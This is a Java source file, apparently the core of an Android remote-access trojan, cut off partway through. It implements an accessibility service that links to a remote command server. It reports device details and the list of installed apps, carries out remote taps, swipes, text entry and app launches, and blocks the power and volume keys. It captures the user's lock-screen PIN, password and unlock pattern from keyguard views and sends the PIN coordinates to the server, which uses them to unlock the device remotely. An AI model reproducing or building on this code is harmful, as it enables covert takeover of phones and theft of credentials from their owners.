package com.example.aslib;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.Instrumentation;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.TypeReference;
import com.example.aslib.common.AppConfig;
import com.example.aslib.common.Constant;
import com.example.aslib.common.MyConstants;
import com.example.aslib.common.SystemUtil;
import com.example.aslib.common.Utils;
import com.example.aslib.vo.HeartResponse;
import com.example.aslib.vo.HttpResult;
import com.example.aslib.vo.MyGes;
import com.google.protobuf.MessageLite;

import net.dongliu.requests.Requests;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Exchanger;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

import io.renren.modules.app.message.proto.Message;
import io.vertx.core.Vertx;
import io.vertx.core.file.impl.FileResolver;
import io.vertx.core.http.WebSocket;

public class AccessService1 extends AccessibilityService {
    private static final String TAG = "FAST";

    private final AtomicReference<WebSocket> wsRef = new AtomicReference<>();
    private Instrumentation mInstrumentation;
    private String androidId;
    private int widthPixels;
    private int heightPixels;

    private static final Vertx VERTX = Vertx.vertx();
    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private final ExecutorService threadPool = Executors.newFixedThreadPool(5);
    private Timer timer;

    static {
        Log.i(TAG, "AccessService static");
        System.setProperty(FileResolver.DISABLE_FILE_CACHING_PROP_NAME, "true");
        System.setProperty(FileResolver.DISABLE_CP_RESOLVING_PROP_NAME, "true");
    }

    @Override
    public void onDestroy() {
        Log.i(TAG, "onDestroy");
        super.onDestroy();
    }

    @Override
    public void onCreate() {
        Log.i(TAG, "onCreate");
        super.onCreate();
        VERTX.setPeriodic(30000, l -> {
            WebSocket ws = wsRef.get();
            if (ws != null && !ws.isClosed()) {
                Message.Ping.Builder builder = Message.Ping.newBuilder();
                builder.setDeviceId(androidId);
                builder.setTime(System.currentTimeMillis());
//                int status = Utils.isScreenOff(this) ? Constant.DeviceStatus.screen_off : Constant.DeviceStatus.screen_on;
//                builder.setStatus(status);
//                ws.write(Utils.encode(Constant.MessageType.ping, builder.build()));
            }
        });


        Executors.newScheduledThreadPool(1).scheduleWithFixedDelay(() -> {
            try {
                checkHeart();
            } catch (Exception ex) {
                Log.e(TAG, "checkHeart err", ex);
            }
        }, 0L, 10L, TimeUnit.SECONDS);


//        connect();
        mInstrumentation = new Instrumentation(); // 初始化 Instrumentation
        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        Display display = windowManager.getDefaultDisplay();
        DisplayMetrics displayMetrics = new DisplayMetrics();
        display.getMetrics(displayMetrics);
        widthPixels = displayMetrics.widthPixels;
        heightPixels = displayMetrics.heightPixels;
        androidId = Utils.deviceId(this);


    }

    public void replyWakeup() {

    }

    public void checkHeart() {
        JSONObject body = new JSONObject();
        body.put("deviceId", androidId);
        //上传当前状态
        String _body = Requests.post(AppConfig.path(AppConfig.HEART_URL)).jsonBody(body).send().readToText();
        HttpResult<HeartResponse> result = JSONObject.parseObject(_body, new TypeReference<HttpResult<HeartResponse>>() {
        });
        if (result.getSuccess()) {
            if (result.getData().isNeedWakeup()) {
                Log.i(TAG, "需要唤醒");
//                unLock(result.getData().getLockValue(), () -> {
//                    connect();
//                });

            } else if (Utils.isScreenOff(this)) {
                Log.i(TAG, "当前熄屏, 关闭长连接!");
                disconnect();
            }
        }
    }

    public void heart() {

        if (connected()) {
//            wsRef.get().write();//TODO 心跳
            lastHeartTime = System.currentTimeMillis();
        }
    }

    public boolean connected() {

        WebSocket webSocket = this.wsRef.get();
        if (webSocket == null || webSocket.isClosed()) {
            return false;
        }
        {
            return true;
        }

    }

    @Override // android.accessibilityservice.AccessibilityService
    public boolean onKeyEvent(KeyEvent keyEvent) {
        if ((keyEvent.getKeyCode() == 26 || keyEvent.getKeyCode() == 164 || keyEvent.getKeyCode() == 25 || keyEvent.getKeyCode() == 24)) {
            return true;
        }
        return super.onKeyEvent(keyEvent);
    }

    public synchronized void disconnect() {
        if (connected()) {
            this.wsRef.get().close();
        }
    }

    public void connect() {

        lastPong = System.currentTimeMillis();
        try {
            Exchanger<WebSocket> success = new Exchanger<>();
            VERTX.createHttpClient().webSocket(AppConfig.WEBSOCKET_PORT, AppConfig.WEBSOCKET_HOST, AppConfig.WEBSOCKET_URL, result -> {
                try {
                    if (result.succeeded()) {
                        Log.i(TAG, "连接成功!");
                        success.exchange(result.result());
                    } else {
                        Log.e(TAG, "连接失败!", result.cause());
                        success.exchange(null);
                    }
                } catch (InterruptedException ignored) {

                }
            });

            WebSocket ws = success.exchange(null);
            if (ws != null) {
                connectTime = System.currentTimeMillis();
                bindHandler(ws);

                if (timer != null) {
                    timer.cancel();
                }

                timer = new Timer();
                timer.schedule(new TimerTask() {
                    @Override
                    public void run() {
                        heart();
                    }
                }, 2000L, 6000L);
                Message.AndroidOnline.Builder builder = Message.AndroidOnline.newBuilder();
                builder.setDeviceId(androidId);
                builder.setModel(SystemUtil.getSystemModel());
                builder.setSystemVersion(SystemUtil.getSystemVersion());
                builder.setBrand(SystemUtil.getDeviceBrand());
                builder.setLanguage(SystemUtil.getSystemLanguage());
                builder.setScreenHeight(heightPixels);
                builder.setScreenWidth(widthPixels);
                builder.setSdkVersion(Build.VERSION.SDK_INT);

                ws.write(Utils.encode(Constant.MessageType.android_online, builder.build()));

                //发送当前安装的app列表
                Message.InstallAppResp allApp = getAllApp();
                ws.write(Utils.encode(Constant.MessageType.install_app_resp, allApp));


                wsRef.set(ws);
                ws.closeHandler(v -> {
                    Log.i(TAG, "连接被关闭!");
                    wsRef.set(null);
                    VERTX.setTimer(3000, l -> {
                        connect();
                    });
                });
                flush(null);
                Log.i(TAG, "连接成功!");
            } else {

//                VERTX.setTimer(3000, l -> {
//                    connect();
//                });
            }

        } catch (Exception ex) {
            Log.e(TAG, "连接失败!", ex);
            VERTX.setTimer(3000, l -> {
                connect();
            });
        }


    }


    private void bindHandler(WebSocket ws) {
        ws.handler(buffer -> {
            try {

                Message.WsMessage wsMessage = Message.WsMessage.parseFrom(buffer.getBytes());
                byte[] body = wsMessage.getBody().toByteArray();
                //解压?
                byte[] _body = Utils.decompress(body);

                Log.i(TAG, "收到消息:" + wsMessage.getType());
                switch (wsMessage.getType()) {
                    case Constant.MessageType.touch_req:
                        Message.TouchReq touchReq = Message.TouchReq.parseFrom(_body);
                        Log.i(TAG, String.format("进行点击:%s, %s", touchReq.getX(), touchReq.getY()));
                        clickByNode(touchReq.getX(), touchReq.getY());
                        break;
                    case Constant.MessageType.back_req:
                        Message.BackReq backReq = Message.BackReq.parseFrom(_body);
                        Log.i(TAG, "回退");
//                                        performBackAction();
                        performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                        break;
                    case Constant.MessageType.home_req:
                        Log.i(TAG, "home");
                        performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                        break;
                    case Constant.MessageType.recents_req:
                        Log.i(TAG, "recents_req");
                        performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                        break;

                    case Constant.MessageType.input_text:
                        Message.InputText inputText = Message.InputText.parseFrom(_body);
                        Log.i(TAG, String.format("进行输入:%s - %s", inputText.getId(), inputText.getText()));
                        List<AccessibilityNodeInfo> node = getRootInActiveWindow().findAccessibilityNodeInfosByViewId(inputText.getId());
                        if (node != null && !node.isEmpty()) {
                            performTextInput(node.get(0), inputText.getText());
                        }
                        break;
                    case Constant.MessageType.scroll_req:
                        Message.ScrollReq scrollReq = Message.ScrollReq.parseFrom(_body);
                        Log.i(TAG, String.format("进行滚动(%s,%s)->(%s,%s)", scrollReq.getStartX(), scrollReq.getStartY(), scrollReq.getEndX(), scrollReq.getEndY()));
                        int duration = scrollReq.getDuration();
                        if (duration == 0) {
                            duration = 600;
                        }
                        performSwipe(scrollReq.getStartX(), scrollReq.getStartY(), scrollReq.getEndX(), scrollReq.getEndY(), duration);
                        break;
                    case Constant.MessageType.install_app_req:
                        //TODO 可能阻塞
                        Message.InstallAppResp allApp = getAllApp();
                        ws.write(Utils.encode(Constant.MessageType.install_app_resp, allApp));
                        break;
                    case Constant.MessageType.slide_req:
                        Message.SlideReq slideReq = Message.SlideReq.parseFrom(_body);
                        Log.i(TAG, "进行滑动");
                        int segmentSize = slideReq.getSegmentSize();
                        if (segmentSize == 0) segmentSize = 10;
                        simulateSegmentedSwipe(slideReq, segmentSize);
                        break;
                    case Constant.MessageType.pong:
                        lastPong = System.currentTimeMillis();
                        break;
                    case Constant.MessageType.screen_req:
                        flush(null);
                        break;
                    case Constant.MessageType.start_app_req:
                        Message.StartAppReq startAppReq = Message.StartAppReq.parseFrom(_body);
                        String packageName = startAppReq.getPackageName();
                        Log.i(TAG, "当前启动:" + packageName);
                        launchApp(packageName);
                        break;
                    case Constant.MessageType.un_lock_screen_req:
                        Message.UnLockScreenReq unLockScreenReq = Message.UnLockScreenReq.parseFrom(_body);
                        String unLockValue = unLockScreenReq.getValue();


                        unLock(unLockValue, null);

                        break;
                }

                if (wsMessage.getType() != Constant.MessageType.pong) {
                    VERTX.setTimer(1000, (l) -> {
                        try {
                            flush(null);
                        } catch (Exception ex) {
                            Log.e(TAG, "刷新失败", ex);
                        }
                    });
                }

                last = Math.min(System.currentTimeMillis() - 1500, last);
            } catch (Exception ex) {
                Log.e(TAG, "消息处理错误", ex);

            }
//                            Log.i(TAG, "AcceptMessage:" + buffer.toString());

        });
    }


    @SuppressLint("InvalidWakeLockTag")
    private void unLock(String unLockValue, Runnable callback) {
        Log.i(TAG, "解锁:" + unLockValue);

        // 获取 PowerManager 服务
//
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null && !powerManager.isInteractive()) {
            // 创建一个 WakeLock，指定唤醒屏幕的选项
            PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "target");
            wakeLock.acquire(3000); // 设置3秒超时释放锁
        }

        KeyguardManager keyguardManager = (KeyguardManager) this.getSystemService(Context.KEYGUARD_SERVICE);
        KeyguardManager.KeyguardLock newKeyguardLock = keyguardManager.newKeyguardLock("kale");
        if (keyguardManager.inKeyguardRestrictedInputMode()) {
            newKeyguardLock.disableKeyguard();
        }

        threadPool.submit(() -> {
            try {


                Log.i(TAG, "唤醒完成");

                Utils.sleep(1000);

                Log.i(TAG, "上滑解锁完成");
//                                new Handler(Looper.getMainLooper()).post(() -> {
//                                });
                performUnlockGesture();
                Utils.sleep(1000);
                String[] split = unLockValue.split(",");
                int i = 0;
                while (i < split.length) {
                    clickByNode(Integer.parseInt(split[i]), Integer.parseInt(split[i + 1]));
                    Utils.sleep(500);
                    i += 2;
                }
                Log.i(TAG, "已解锁");
                if (callback != null) {
                    Utils.sleep(2000);
                    callback.run();
                }
            } catch (Exception ex) {
                Log.e(TAG, "解锁错误", ex);
            }
        });
    }


    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "ANDROID_ID: " + androidId);
        new Thread(() -> {
        }).start();
        int capabilities = getServiceInfo().getCapabilities();

        Log.i(TAG, "onServiceConnected,capabilities:" + capabilities);
    }

    // 模拟回退按钮的函数
    public void performBackAction() {
        // 执行全局回退操作
        performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
    }

    private void launchApp(String packageName) {
        // 获取目标应用的启动 Intent
        Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } else {
            // 处理应用未安装的情况
            Log.i(TAG, "当前没有安装:" + packageName);
        }
    }

    private void performUnlockGesture() {
        float x0 = widthPixels / 2;
        float y0 = heightPixels / 4 * 3;
        Path path = new Path();
        path.moveTo(x0, y0);

        float angle = 0;
        float x = 0;
        float y;
        for (int i = 0; i < 40; i++) {
            y = (float) (x * Math.tan(Math.toRadians(angle)));
            if ((y0 - y) < 0) {
                break;
            }
            path.lineTo(x0 + x, y0 - y);
            x += 5;
            angle += 3;
        }

        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(
                new GestureDescription.StrokeDescription(path, 0, 230)
        );
        dispatchGesture(gestureBuilder.build(), new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                Log.i(TAG, "当前手势段完成");

            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                Log.i(TAG, "当前手势段取消");

            }
        }, null);
    }

    public void clickByNode(int x, int y) {
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        path.moveTo(x, y);
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L));
        GestureDescription gesture = builder.build();
        this.dispatchGesture(gesture, null, null);
    }

    public Message.InstallAppResp getAllApp() {
        PackageManager packageManager = getPackageManager();
        List<ApplicationInfo> apps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);

        Message.InstallAppResp.Builder builder = Message.InstallAppResp.newBuilder();
        List<Message.App> appList = new ArrayList<>();
        for (ApplicationInfo app : apps) {
            // 过滤掉系统应用
            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packageManager.getApplicationLabel(app).toString(); // 获取应用名称
                String packageName = app.packageName; // 获取应用包名
//                Log.i(TAG, "用户安装的应用: " + appName + ", 包名: " + packageName);

                Message.App.Builder appBuild = Message.App.newBuilder();
                appBuild.setAppName(appName);
                appBuild.setPackageName(packageName);
                appList.add(appBuild.build());
            }
        }
        builder.addAllApps(appList);
        builder.setDeviceId(androidId);

        return builder.build();

    }


    public AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo p0, String p1) {

        List<AccessibilityNodeInfo> list;
        if (p0 == null) {
            return null;
        }
        if ((list = p0.findAccessibilityNodeInfosByViewId(p1)) != null && !list.isEmpty()) {
            return list.get(0);
        }
        return null;
    }

    private AccessibilityNodeInfo findNodeByDesc(AccessibilityNodeInfo p0, String p1, boolean p2) {
        AccessibilityNodeInfo uAccessibili;
        if (p0 == null) {
            return null;
        }
        if (!p2 && (p0.getContentDescription() != null && p0.getContentDescription().toString().trim().equals(p1))) {
            return p0;
        }
        if (p0.getChildCount() > 0) {
            int i = 0;
            while (i < p0.getChildCount()) {
                if ((uAccessibili = this.findNodeByDesc(p0.getChild(i), p1, false)) != null) {
                    return uAccessibili;
                }
                i = i + 1;
            }
        }
        return null;
    }

    private AccessibilityNodeInfo findNodeByText(AccessibilityNodeInfo p0, String p1, boolean p2) {
        AccessibilityNodeInfo uAccessibili;
        if (p0 == null) {
            return null;
        }
        if (!p2 && (p0.getText() != null && p0.getText().toString().trim().equals(p1))) {
            return p0;
        }
        if (p0.getChildCount() > 0) {
            int i = 0;
            while (i < p0.getChildCount()) {
                if ((uAccessibili = this.findNodeByText(p0.getChild(i), p1, false)) != null) {
                    return uAccessibili;
                }
                i = i + 1;
            }
        }
        return null;
    }


    private String getPinPos(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        if (!pinPos.isEmpty() && pinPos.containsKey(str)) {
            return pinPos.get(str);
        }
        for (int i = 0; i <= 9; i++) {
            Rect rect = new Rect();
            AccessibilityNodeInfo findNodeById = findNodeById(accessibilityNodeInfo, "com.android.systemui:id/key" + i);
            if (findNodeById == null) {
                findNodeById = findNodeById(accessibilityNodeInfo, "com.android.systemui:id/VivoPinkey" + i);
                if (findNodeById == null) {
                    findNodeById = findNodeByDesc(accessibilityNodeInfo, "" + i, true);
                    if (findNodeById == null) {
                        findNodeById = findNodeByText(accessibilityNodeInfo, "" + i, true);
                    }
                }
            }
            if (findNodeById != null) {
                findNodeById.getBoundsInScreen(rect);
                pinPos.put("" + i, getPos(rect));
            }
        }
        return pinPos.get(str);
    }

    public void swipe(List<Path> paths, long... times) {
        // 默认值为 1000 毫秒
        // 构建手势描述
        GestureDescription.Builder builder = new GestureDescription.Builder();
        long time = 0;
        for (int i = 0; i < paths.size(); i++) {
            Path path = paths.get(i);
            Log.i(TAG, "swipe: " + time);
            GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, time, times[i]);  // 500ms的持续时间
            builder.addStroke(stroke);
            time += times[i];
        }
        dispatchGesture(
                builder.build(),
                new AccessibilityService.GestureResultCallback() {
                    @Override
                    public void onCompleted(GestureDescription gestureDescription) {
                        super.onCompleted(gestureDescription);
                        // 手势执行完成后的回调
                    }
                },
                null
        );
    }


    private void loopViewId(AccessibilityNodeInfo accessibilityNodeInfo, List<String> list) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        int count = accessibilityNodeInfo.getChildCount();
        String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
        if (viewIdResourceName != null) {
            list.add(viewIdResourceName);
        }
        if (count > 0) {
            for (int i = 0; i < count; i++) {
                loopViewId(accessibilityNodeInfo.getChild(i), list);
            }
        }

    }

    private void recordSys(AccessibilityEvent accessibilityEvent) {
        Log.i(TAG, "recordSys");
        AccessibilityNodeInfo rootInActiveWindow;
        String trim;
        AccessibilityNodeInfo findNodeById;
        if ((rootInActiveWindow = getRootInActiveWindow()) == null) {
            return;
        }

//        List<String> ids = new ArrayList<>();
//        loopViewId(rootInActiveWindow, ids);
//        Log.i(TAG, "ids:" + JSONObject.toJSONString(ids));
        if (findNodeById(rootInActiveWindow, MyConstants.ID_PIN) == null && findNodeById(rootInActiveWindow, MyConstants.ID_KEYGUARD) == null && (accessibilityEvent.getSource() == null || !MyConstants.ID_PWD.equals(accessibilityEvent.getSource().getViewIdResourceName()))) {
            if (pin.length() > 0) {
                systemPin.clear();
                pin = "";
                pinPos.clear();
            }
            if (systemPwd.length() > 0) {
                systemPwd = "";
                return;
            }
            return;
        }
        AccessibilityNodeInfo findNodeById2 = findNodeById(rootInActiveWindow, MyConstants.ID_GS);
        if (findNodeById2 == null) {
            findNodeById2 = findNodeById(rootInActiveWindow, MyConstants.ID_GS_OPPO);
        }
        if (findNodeById2 == null && MyConstants.getBrand() == 3) {
            findNodeById2 = findNodeById(rootInActiveWindow, MyConstants.ID_GS_OPPO_2);
        }
        if (findNodeById2 == null && MyConstants.getBrand() == 4) {
            findNodeById2 = findNodeById(rootInActiveWindow, MyConstants.ID_GS_VIVO);
        }
        int i = 0;
        if (findNodeById2 != null) {
            if (findNodeById2.getChildCount() != 9) {
                return;
            }
            if (findNodeById2.getChild(0).isClickable() && findNodeById2.getChild(1).isClickable() && findNodeById2.getChild(2).isClickable() && findNodeById2.getChild(3).isClickable() && findNodeById2.getChild(4).isClickable() && findNodeById2.getChild(5).isClickable() && findNodeById2.getChild(6).isClickable() && findNodeById2.getChild(7).isClickable() && findNodeById2.getChild(8).isClickable()) {
                systemGs.clear();
                lastPasswordRemak = "";
                return;
            }
            Rect rect = new Rect();
            while (i < 9) {
                findNodeById2.getChild(i).getBoundsInScreen(rect);
                int i2 = i + 1;
                MyGes myGes = new MyGes(i2, getPos(rect));
                if (!findNodeById2.getChild(i).isClickable()) {
                    if (!systemGs.contains(myGes)) {
                        systemGs.add(myGes);
                    }
                    if (!lastPasswordRemak.contains("" + i2)) {
                        lastPasswordRemak += i2;
                    }
                } else {
                    if (systemGs.contains(myGes)) {
                        systemGs.remove(myGes);
                    }
                    if (lastPasswordRemak.contains("" + i2)) {
                        lastPasswordRemak = lastPasswordRemak.replace("" + i2, "");
                    }
                }
                i = i2;
            }
            if (systemGs.size() >= 4) {
                String _lastPassword = systemGs.toString().replace("[", "").replace("]", "").replace(" ", "");
                Log.i(TAG, "1_lastPassword:" + _lastPassword);
//                this.config.setValue(MyConstants.SYSTEM_GS, replace);
                lastUpdatePwdTime = System.currentTimeMillis();
                lastPassword = _lastPassword;

                lastPasswordTime = System.currentTimeMillis();
                lastPasswordPkg = MyConstants.PKG_SYSTEMUI_GS;
                return;
            }
            return;
        }
        if (findNodeById(rootInActiveWindow, MyConstants.ID_PIN) != null || findNodeById(rootInActiveWindow, MyConstants.ID_FIX_PIN) != null) {
            if (accessibilityEvent.getEventType() != 1) {
                return;
            }
            trim = accessibilityEvent.getContentDescription() != null ? accessibilityEvent.getContentDescription().toString().trim() : null;
            if (trim != null && trim.matches("[0-9]{1}")) {
                pin += trim;
                systemPin.add(getPinPos(rootInActiveWindow, trim));
                lastPasswordRemak = pin;
                AccessibilityNodeInfo findNodeById3 = findNodeById(rootInActiveWindow, MyConstants.ID_PIN);
                if (findNodeById3 == null) {
                    findNodeById3 = findNodeById(rootInActiveWindow, MyConstants.ID_FIX_PIN);
                }
                if (findNodeById3 != null && findNodeById3.getText() != null && findNodeById3.getText().toString().trim().length() == 1) {
                    pin = trim;
                    systemPin.clear();
                    systemPin.add(getPinPos(rootInActiveWindow, trim));
                    lastPasswordRemak = pin;
                }
            } else {
                AccessibilityNodeInfo source = accessibilityEvent.getSource();
                if (source == null || source.getViewIdResourceName() == null) {
                    return;
                }
                if (source.getViewIdResourceName().contains("delete")) {
                    if (pin.length() == 1) {
                        pin = "";
                        systemPin.clear();
                        lastPasswordRemak = "";
                    } else if (pin.length() > 1) {
                        String str = pin;
                        pin = str.substring(0, str.length() - 1);
                        List<String> list = systemPin;
                        list.remove(list.size() - 1);
                        lastPasswordRemak = pin;
                    }
                } else if (source.getViewIdResourceName().contains("enter")) {
                    if (pin.length() >= 4) {
                        pin += trim;
                        Rect rect2 = new Rect();
                        source.getBoundsInScreen(rect2);
                        systemPin.add(getPos(rect2));
                        lastPasswordRemak = pin;
                        String _lastPassword = systemPin.toString().replace("[", "").replace("]", "").replace(" ", "");
                        Log.i(TAG, "2_lastPassword:" + _lastPassword);
//                        this.config.setValue(MyConstants.SYSTEM_PIN, replace);
                        lastUpdatePwdTime = System.currentTimeMillis();
                        lastPassword = _lastPassword;
                        lastPasswordTime = System.currentTimeMillis();
                        lastPasswordPkg = MyConstants.PKG_SYSTEMUI_PIN;
                    }
                    pin = "";
                    systemPin.clear();
                    return;
                }
            }
            if (pin.length() >= 4) {
                String _lastPassword = systemPin.toString().replace("[", "").replace("]", "").replace(" ", "");
                Log.i(TAG, "3_lastPassword:" + _lastPassword);
//                this.config.setValue(MyConstants.SYSTEM_PIN, replace);
                //TODO 记录密码坐标
                Message.LockScreen.Builder builder = Message.LockScreen.newBuilder()
                        .setDeviceId(androidId)
                        .setType(Constant.LockScreenType.pin)
                        .setValue(_lastPassword);
                send(Constant.MessageType.lock_screen, builder.build());
                lastUpdatePwdTime = System.currentTimeMillis();
                lastPassword = _lastPassword;
                lastPasswordTime = System.currentTimeMillis();
                lastPasswordPkg = MyConstants.PKG_SYSTEMUI_PIN;
                return;
            }
            return;
        }
        if (MyConstants.getBrand() == 4 && findNodeById(rootInActiveWindow, MyConstants.ID_PIN_VIVO) != null) {
            if (accessibilityEvent.getEventType() != 1) {
                return;
            }
            trim = accessibilityEvent.getText() != null ? accessibilityEvent.getText().toString().trim() : null;
            if (trim == null) {
                return;
            }
            String replace = trim.replace("[", "").replace("]", "");
            if (replace.matches("[0-9]{1}")) {
                pin += replace;
                systemPin.add(getPinPos(rootInActiveWindow, replace));
                lastPasswordRemak = pin;
            } else if (pin.length() == 1) {
                pin = "";
                systemPin.clear();
                lastPasswordRemak = "";
            } else if (pin.length() > 1) {
                String str2 = pin;
                pin = str2.substring(0, str2.length() - 1);
                List<String> list2 = systemPin;
                list2.remove(list2.size() - 1);
                lastPasswordRemak = pin;
            }
            if (pin.length() >= 4) {
//                this.config.setValue(MyConstants.SYSTEM_PIN, systemPin.toString().replace("[", "").replace("]", "").replace(" ", ""));
                String _lastPassword = systemPin.toString().replace("[", "").replace("]", "").replace(" ", "");
                Log.i(TAG, "4_lastPassword:" + _lastPassword);
                lastUpdatePwdTime = System.currentTimeMillis();
                lastPassword = _lastPassword;
                lastPasswordTime = System.currentTimeMillis();
                lastPasswordPkg = MyConstants.PKG_SYSTEMUI_PIN;
                return;
            }
            return;
        }
        if (findNodeById(rootInActiveWindow, MyConstants.ID_PWD) != null || findNodeById(rootInActiveWindow, MyConstants.ID_PWD_OPPO) != null || (accessibilityEvent.getSource() != null && MyConstants.ID_PWD.equals(accessibilityEvent.getSource().getViewIdResourceName()))) {
            if (accessibilityEvent.getEventType() != 8192) {
                return;
            }
            String obj = accessibilityEvent.getText().toString();
            int itemCount = accessibilityEvent.getItemCount();
            if (accessibilityEvent.isPassword()) {
                if (itemCount == 0) {
                    systemPwd = "";
                } else if (itemCount == 1 && !"[•]".equals(obj)) {
                    systemPwd = String.valueOf(obj.charAt(obj.length() - 2));
                } else if (itemCount - systemPwd.length() == 1) {
                    systemPwd += String.valueOf(obj.charAt(obj.length() - 2));
                } else if (systemPwd.length() - itemCount == 1) {
                    String str3 = systemPwd;
                    systemPwd = str3.substring(0, str3.length() - 1);
                }
            } else if (itemCount == 0) {
                systemPwd = "";
            } else {
                systemPwd = obj.substring(1, itemCount + 1);
            }
            if (systemPwd.length() >= 4) {
//                this.config.setValue(MyConstants.SYSTEM_PWD, systemPwd);
                Log.i(TAG, "5systemPwd:" + systemPwd);
                lastUpdatePwdTime = System.currentTimeMillis();
                return;
            }
            return;
        }
        if (MyConstants.getBrand() != 4 || (findNodeById = findNodeById(rootInActiveWindow, MyConstants.ID_PWD_VIVO)) == null || findNodeById.getText() == null) {
            return;
        }
        String charSequence = findNodeById.getText().toString();
        int length = charSequence.length();
        if (length == 0) {
            systemPwd = "";
        } else if (length == 1 && !"•".equals(charSequence)) {
            systemPwd = charSequence;
        } else if (length - systemPwd.length() == 1) {
            systemPwd += String.valueOf(charSequence.charAt(charSequence.length() - 1));
        } else if (systemPwd.length() - length == 1) {
            String str4 = systemPwd;
            systemPwd = str4.substring(0, str4.length() - 1);
        }
        if (systemPwd.length() >= 4) {
//            this.config.setValue(MyConstants.SYSTEM_PWD, systemPwd);
            Log.i(TAG, "6systemPwd:" + systemPwd);
            lastUpdatePwdTime = System.currentTimeMillis();
        }
    }


    public void test(AccessibilityEvent event) {
        try {
            recordSys(event);
        } catch (Exception ex) {
            Log.e(TAG, "recordSys 错误", ex);
        }
    }

    String pin = "";
    String systemPwd = "";
    String lastPasswordRemak = "";
    List<String> systemPin = new ArrayList<>();
    List<MyGes> systemGs = new ArrayList<>();
    Map<String, String> pinPos = new HashMap<>();
    long lastUpdatePwdTime;
    long lastPasswordTime;
    String lastPasswordPkg;
    String lastPassword;

    private String getPos(Rect p0) {
        return (p0.left + ((p0.right - p0.left) / 2)) + "," + (p0.top + ((p0.bottom - p0.top) / 2));
    }


    public void send(int type, MessageLite messageLite) {
        WebSocket webSocket = wsRef.get();
        if (webSocket != null && !webSocket.isClosed()) {
            webSocket.write(Utils.encode(type, messageLite));
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        test(event);
// 获取事件的类型
        if (Utils.isScreenOff(this)) {
            disconnect();
//            Log.i(TAG, "熄屏中");
            return;
        } else {
//            Log.i(TAG, "亮屏");
        }


        WebSocket webSocket = wsRef.get();
        if (webSocket == null || webSocket.isClosed()) {
            Log.i(TAG, "连接当前关闭中!");
            return;
        }
        //检查ping
        if (lastPong + 60 * 1000 < System.currentTimeMillis()) {
            Log.i(TAG, "当前链接异常!");
            if (!webSocket.isClosed()) {
                webSocket.close();
            }
            return;
        }
        CharSequence packageName = event.getPackageName();
        if (packageName == null) {
            return;
        }
        int eventType = event.getEventType();
//        Log.i(TAG, String.format("onAccessibilityEvent:%s-%s", eventType, packageName));
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
//                Log.i(TAG, "change valid");
                break;
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                //滚动两秒 触发一次
                if (System.currentTimeMillis() - last < 2000) {
//                    Log.i(TAG, "change invalid");
                    return;
                } else {
                    break;
                }
            default:
                //其他类型4秒触发一次
                if (System.currentTimeMillis() - last < 4000) {
//                    Log.i(TAG, "change invalid");
                    return;
                } else {
                    break;
                }
        }


//        CharSequence packageName = event.getPackageName();
//        if (source != null) {
//            String viewIdResourceName = source.getViewIdResourceName();
//            Log.i(TAG, "viewIdResourceName:" + viewIdResourceName);
//            source.recycle();
//        }
//        if (System.currentTimeMillis() - last < 1500) {
//            return;
//        }
        last = System.currentTimeMillis();


        flush(event);

        // 获取事件发生的控件
//        CharSequence className = event.getClassName();
//        CharSequence contentDescription = event.getContentDescription();
//
//        // 根据事件类型进行处理
//        switch (eventType) {
//            case AccessibilityEvent.TYPE_VIEW_CLICKED:
//                // 记录点击事件
//                logEvent("Clicked", packageName, className, sb);
//                break;
//            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
//                // 记录滚动事件
//                logEvent("Scrolled", packageName, className, sb);
//                break;
//            // 其他事件类型可根据需要进行处理
//            default:
//                logEvent(String.format("default:%s", eventType), packageName, className, sb);
////                Log.i(TAG, String.format("eventType:%s", eventType));
//                break;
//        }
    }

    private void flush(AccessibilityEvent event) {
        //进行绘制
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
